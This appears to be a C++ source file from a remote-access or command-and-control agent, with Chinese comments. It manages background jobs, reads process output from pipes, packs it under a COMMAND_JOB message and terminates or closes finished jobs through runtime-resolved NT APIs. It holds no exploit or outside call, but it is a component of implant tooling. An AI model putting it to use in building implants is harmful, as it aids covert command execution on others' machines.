// 文件作用：后台 job 管理实现：检查异步任务状态，并把完成结果打包回传。
#include "JobsController.h"
#include "ApiLoader.h"

// JobsController::operator new 使用本项目的内存分配函数创建 job 管理器。
void* JobsController::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

// JobsController::operator delete 释放 job 管理器占用的本地内存。
void JobsController::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(JobsController));
}

// CreateJobData 创建后台任务记录，保存进程句柄、PID、输入输出管道和状态。
JobData JobsController::CreateJobData(ULONG taskId, WORD Type, WORD State, HANDLE object, WORD pid, HANDLE input, HANDLE output)
{
    JobData jobData = { taskId, Type, State, object, pid, input, output };
	this->jobs.push_back(jobData);
	return jobData;
}

// ProcessJobs 检查后台任务是否结束，并读取输出打包回传。
void JobsController::ProcessJobs(Packer* packer)
{
	if ( !this->jobs.size() )
		return;

	for (int i = 0; i < this->jobs.size(); i++) {

        ULONG  available = 0;
		LPVOID buffer    = ReadDataFromAnonPipe(this->jobs[i].pipeRead, &available);
        if (available > 0) {
			packer->Pack32(jobs[i].jobId);
			packer->Pack32(COMMAND_JOB);
			packer->Pack8(jobs[i].jobType);
			packer->Pack8(JOB_STATE_RUNNING);
			packer->PackBytes((BYTE*)buffer, available);
			
			MemFreeLocal(&buffer, available);
        }

		if (jobs[i].jobState == JOB_STATE_RUNNING) {

            ULONG status = 0;
			if (jobs[i].jobType == JOB_TYPE_PROCESS) {
				ApiWin->GetExitCodeProcess(jobs[i].jobObject, &status);
			}

			if (status != STILL_ACTIVE) {
				jobs[i].jobState = JOB_STATE_FINISHED;
			}
		}

		if (jobs[i].jobState == JOB_STATE_KILLED || jobs[i].jobState == JOB_STATE_FINISHED) {

			if (jobs[i].jobType == JOB_TYPE_PROCESS && jobs[i].jobState == JOB_STATE_KILLED) {
				ApiNt->NtTerminateProcess(jobs[i].jobObject, NULL);
			}

			if (jobs[i].pipeRead) {
				ApiNt->NtClose(jobs[i].pipeRead);
				jobs[i].pipeRead = NULL;
			}
			if (jobs[i].pipeWrite) {
				ApiNt->NtClose(jobs[i].pipeWrite);
				jobs[i].pipeWrite = NULL;
			}
			if (jobs[i].jobObject) {
				ApiNt->NtClose(jobs[i].jobObject);
				jobs[i].jobObject = NULL;
			}

			packer->Pack32(jobs[i].jobId);
			packer->Pack32(COMMAND_JOB);
			packer->Pack8(jobs[i].jobType);
			packer->Pack8(jobs[i].jobState);

			jobs.remove(i);
			--i;
		}
	}
}
